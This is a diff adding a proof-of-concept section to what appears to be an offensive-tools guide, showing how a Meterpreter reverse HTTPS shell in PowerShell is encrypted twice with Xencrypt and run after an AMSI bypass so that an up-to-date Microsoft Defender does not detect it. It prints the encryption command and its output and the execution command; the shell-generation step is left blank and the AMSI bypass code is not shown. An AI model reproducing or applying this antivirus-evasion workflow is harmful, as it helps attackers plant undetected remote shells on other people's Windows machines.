@@ -182,3 +182,48 @@ PS C:\Users\Administrator\Documents\Tools-AD> invoke-rubeus
 <SNIP>
 
 
+=================================================================================================================================================================================
+PoC 3 - Example with a x64 Meterpreter reverse https shell (.ps1) encrypted 2 times and a Windows 10 laptop (fully patched with MS Defender AV enabled and up-to-date)
+=================================================================================================================================================================================
+
+Step 1 - Generate a x64 Meterpreter reverse https shell in PowerShell format with the option 'psh-reflection'
+--------------------------------------------------------------------------------------------------------------
+
+
+Step 2 - Encrypt the powershell script containing the x64 Meterpreter reverse https shell with 2 iterations of Xencrypt
+------------------------------------------------------------------------------------------------------------------------
+
+PS C:\temp>  Invoke-Xencrypt -InFile C:\Users\Administrator.PO718687\Documents\Tools-AD\Invoke-meterpreter-x64-reverse-https.ps1 -OutFile C:\temp\Invoke-meterpreter-x64-reverse-https-encrypted.ps1 -Iterations 2
+
+Xencrypt  Copyright (C) 2020  Xentropy ( @SamuelAnttila )
+This program comes with ABSOLUTELY NO WARRANTY; for details type show w'.
+This is free software, and you are welcome to redistribute it under certain conditions.
+
+[*] Reading 'C:\Users\Administrator.PO718687\Documents\Tools-AD\Invoke-meterpreter-x64-reverse-https.ps1' ...
+[*] Starting code layer  ...
+[*] Compressing ...
+[*] Generating encryption key ...
+[*] Encrypting ...
+[*] Finalizing code layer ...
+[*] Starting code layer  ...
+[*] Compressing ...
+[*] Generating encryption key ...
+[*] Encrypting ...
+[*] Finalizing code layer ...
+[*] Writing 'C:\temp\Invoke-meterpreter-x64-reverse-https-encrypted.ps1' ...
+[+] Done!
+
+
+Step 3 - AMSI bypass + Execution on a target Windows machine of the encrypted powershell script containing the x64 Meterpreter reverse https shell
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+PS C:\user\administrator> . .\Invoke-meterpreter-x64-reverse-https-encrypted.ps1
+
+=> The MS Defender AV is neabled and up-to-date on the target Windows machine but it does not detect nor block the Meterpreter shell.
+
+
+Step 4 - You hav now a meterpeter shell running 
+-------------------------------------------------
+
+
+
